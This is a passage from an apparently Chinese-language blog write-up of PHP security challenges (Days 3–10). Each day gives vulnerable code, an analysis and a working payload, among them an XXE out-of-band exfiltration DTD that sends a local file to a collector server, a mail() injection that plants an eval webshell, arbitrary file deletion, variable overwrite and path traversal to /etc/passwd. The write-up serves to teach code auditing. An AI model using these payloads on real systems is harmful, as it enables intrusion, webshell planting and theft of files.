class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;data[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在php5.4以下版本中，如果我们输入<code>../../../../etc/passwd</code>是，就会调用<code>class_exists()</code>，这样就会触发<code>__autoload()</code>，这样就是一个任意文件包含的漏洞了，此类漏洞在之后的版本中进行了修复。</p><p>代码中执行<code>class_exists</code>来判断类是否存在，存在则通过<code>include</code>包含到代码中，php自带的内置类也可用通过此方式包含，因此可以利用<code>SimpleXMLElement</code>进行xxe攻击。通过实例化类来执行构造的xml文件。但是存在一个问题，没有代码中并没有输出结果，因此无法直接在网页中显示，可以通过访问外部url的方式将数据发送出去。</p><h3 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地环境：phpEnv+kali</p><p>发送GET请求加载<code>SimpleXMLElement</code>以及xml语法。使用file协议读取c盘下的文件，并加载外部dtd文件使得到的结构发送到我们指定的服务器上。xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/Users/Tonys/Desktop/pass.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.56.102:8080/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.56.102/get.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">        &gt;</span><br><span class="line">        %all;</span><br></pre></td></tr></table></figure><p>get.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">"result.txt"</span>, $_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h2><h3 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">      (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">    ) &#123;</span><br><span class="line">      $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">        <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">      $xml = sprintf($format, $user, $pass);</span><br><span class="line">      $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">      <span class="comment">// Perform the actual login.</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过代码可知，使用<code>strpos</code>来阻止<code>&lt;</code>和<code>&gt;</code>出现在输入的字符串中，来防止xml注入。但通过php的特性，测试得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(0==false);</span><br><span class="line">bool(true)</span><br><span class="line">php &gt; var_dump(!0==true);</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure><p>因此输入内容的开头为<code>&lt;</code>或<code>&gt;</code>依然可以通过验证。</p><h3 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></pre></td></tr></table></figure><p>最终传入到<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p><h2 id="Day-5-Postcard"><a href="#Day-5-Postcard" class="headerlink" title="Day 5 - Postcard"></a>Day 5 - Postcard</h2><h3 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">      <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这段代码实现了发送邮件的功能，其中关于mail的大部分参数属于用户可控的输入，mail函数的手册如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bool mail ( string $to  电子邮件收件人,或收件人列表</span><br><span class="line">, string $subject       电子邮件的主题</span><br><span class="line">, string $message       邮件内容</span><br><span class="line">[, string $additional_headers 指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</span><br><span class="line">[, string $additional_parameters ]] ) 许多web应用使用它设置发送者的地址和返回路径</span><br></pre></td></tr></table></figure><p>当调用php内置mail函数时，如果没有恰当过滤第5个参数，可以被注入恶意参数，引发命令执行漏洞。php将调用execve()执行sendmail程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve("/bin/sh","sh","-c","/usr/sbin/sendmail -t -i -f admin@localhost"],[/* 24 environment var */])</span><br></pre></td></tr></table></figure><p>虽然PHP会使用escapeshellcmd函数来过滤参数的内容，对特殊字符的转义来防止恶意命令执行（&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A and \xFF.’ “这些字符都不能使用），但是我们可以添加命令执行的其他参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-X logfile是记录log文件的，就是可以写文件；</span><br><span class="line">-C file是临时加载一个配置文件，就是可以读文件；</span><br><span class="line">-O option=value 是临时设置一个邮件存储的临时目录的配置。</span><br></pre></td></tr></table></figure><p>代码中进行了两次过滤，分别是<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code>和<code>escapeshellarg($email)</code>。我们接下来分别分析这两个过滤函数。关于 <code>filter_var()</code> 中 <code>FILTER_VALIDATE_EMAIL</code>这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">PHP FILTER_VALIDATE_EMAIL</a> 。有个结论为<code>none of the special characters in this local part are allowed outside quotation marks</code> ，表示所有的特殊符号必须放在双引号中，这样便可绕过对特殊符号的过滤问题，测试如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Tonys&gt;PHP -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(filter_var('"...\.llowed"@vsplate.com',FILTER_VALIDATE_EMAIL));</span><br><span class="line">string(25) ""...\.llowed"@vsplate.com"</span><br><span class="line">php &gt; var_dump(filter_var('\'is."\'\ not\ allowed"@vsplate.com',FILTER_VALIDATE_EMAIL));</span><br><span class="line">string(33) "'is."'\ not\ allowed"@vsplate.com"</span><br></pre></td></tr></table></figure><p>接下来分析<code>escapeshellarg</code>，<code>escapeshellarg()</code> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 <code>shell</code> 函数，<code>shell</code>函数包含<code>exec()</code>，<code>system()</code>执行运算符(反引号)。</p><p>前面说过了PHP的 <code>mail()</code> 函数在底层调用了 <code>escapeshellcmd()</code> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过<code>filter_var()</code> 的检测，但还是会被 <code>escapeshellcmd()*</code>处理。然而 <code>escapeshellcmd()</code>和 <code>escapeshellarg</code> 一起使用，会造成特殊字符逃逸。具体参考如下paper：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/164/</span><br></pre></td></tr></table></figure><h3 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a.&quot;&apos;\ -OQueueDirectory=\%0D&lt;?=eval($_GET[c])?&gt;\ -X/var/www/html/&quot;@a.php</span><br></pre></td></tr></table></figure><p>参考：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php/</span></span><br></pre></td></tr></table></figure><h2 id="Day-6-Frost-Pattern"><a href="#Day-6-Frost-Pattern" class="headerlink" title="Day 6 - Frost Pattern"></a>Day 6 - Frost Pattern</h2><h3 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unknown action'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">    $token = md5($seed);</span><br><span class="line">    file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">    $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">    unlink(<span class="string">'/tmp/tokens/'</span> . $file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大致逻辑为生成用户的token，并根据token删除相应的文件。在删除时对用户输入的数据进行了控制，非<code>a-z</code>，<code>-</code>，<code>.</code>，<code>_</code>的字符都将替换为空。</p><p>但在这个正则中，<code>-</code>并没有进行转义操作，因此实际意思为非46-122的ascii中的字符替换为空。</p><h3 id="漏洞验证-5"><a href="#漏洞验证-5" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>应为正则的设置不正确，可造成任意文件删除，对于一些cms系统，删除其安装文件可重装cms，进而控制后台以及服务器端。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=delete&amp;data=../../config.php</span><br></pre></td></tr></table></figure><h2 id="Day-7-Bells"><a href="#Day-7-Bells" class="headerlink" title="Day 7 - Bells"></a>Day 7 - Bells</h2><h3 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $config, $db;</span><br><span class="line">  <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">    $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">      $config[<span class="string">'dbhost'</span>],</span><br><span class="line">      $config[<span class="string">'dbuser'</span>],</span><br><span class="line">      $config[<span class="string">'dbpass'</span>],</span><br><span class="line">      $config[<span class="string">'dbname'</span>]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">  $stmt = $db-&gt;prepare($sql);</span><br><span class="line">  $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">  $stmt-&gt;bind_result($name);</span><br><span class="line">  $stmt-&gt;execute();</span><br><span class="line">  $stmt-&gt;fetch();</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码为sql查询逻辑，获取输入id，使用了面向对象风格，其中<code>bind_param</code>中各个类型表示的意思如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">icorresponding variable has type integer</span><br><span class="line">dcorresponding variable has type double</span><br><span class="line">scorresponding variable has type string</span><br><span class="line">bcorresponding variable is a blob and will be sent in packets</span><br></pre></td></tr></table></figure><p>但是代码代码中使用了<code>parse_url</code>，明显存在变量覆盖漏洞，数据库的各种参数都是可控的，以及返回结构都可以进行伪造。</p><h3 id="漏洞验证-6"><a href="#漏洞验证-6" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地构建数据库，返回结构进行自定义，可绕过服务端数据库中数据的检测。</p><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=malicious&amp;id=1</span><br></pre></td></tr></table></figure><h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><h3 id="漏洞代码-7"><a href="#漏洞代码-7" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">    $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"/lang/$sanitizedLang"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $lang = $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] ?? <span class="string">'en'</span>;</span><br><span class="line">    <span class="keyword">return</span> $lang;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> LanguageManager())-&gt;loadLanguage();</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大致逻辑逻辑为加载设置加载文本时所展示的语言，并通过<code>str_replace</code>对输入的数据进行了替换，然后通过<code>require_once</code>包含该文件。但<code>str_replace</code>只进行了单次替换，包含的路径依然可控。</p><p>测试如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(str_replace(<span class="string">'../'</span>, <span class="string">''</span>, <span class="string">'../etc/passwd'</span>));</span><br><span class="line">string(<span class="number">10</span>) <span class="string">"etc/passwd"</span></span><br><span class="line">php &gt; var_dump(str_replace(<span class="string">'../'</span>, <span class="string">''</span>, <span class="string">'..././etc/passwd'</span>));</span><br><span class="line">string(<span class="number">13</span>) <span class="string">"../etc/passwd"</span></span><br></pre></td></tr></table></figure><h3 id="漏洞验证-7"><a href="#漏洞验证-7" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>request head处添加如下请求，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accept-language: ..././..././..././etc/passwd</span><br></pre></td></tr></table></figure><h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><h3 id="漏洞代码："><a href="#漏洞代码：" class="headerlink" title="漏洞代码："></a>漏洞代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">  header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">  goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>extract作用为从数组中将变量导入到当前的符号表，效果如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="variable">$var_array</span> = array(<span class="string">"color"</span> =&gt; <span class="string">"blue"</span>,</span><br><span class="line">php (                    <span class="string">"size"</span>  =&gt; <span class="string">"medium"</span>,</span><br><span class="line">php (                    <span class="string">"shape"</span> =&gt; <span class="string">"sphere"</span>);</span><br><span class="line">php &gt; var_dump(extract(<span class="variable">$var_array</span>));</span><br><span class="line">int(<span class="number">3</span>)</span><br><span class="line">php &gt; var_dump(<span class="variable">$color</span>);</span><br><span class="line">string(<span class="number">4</span>) <span 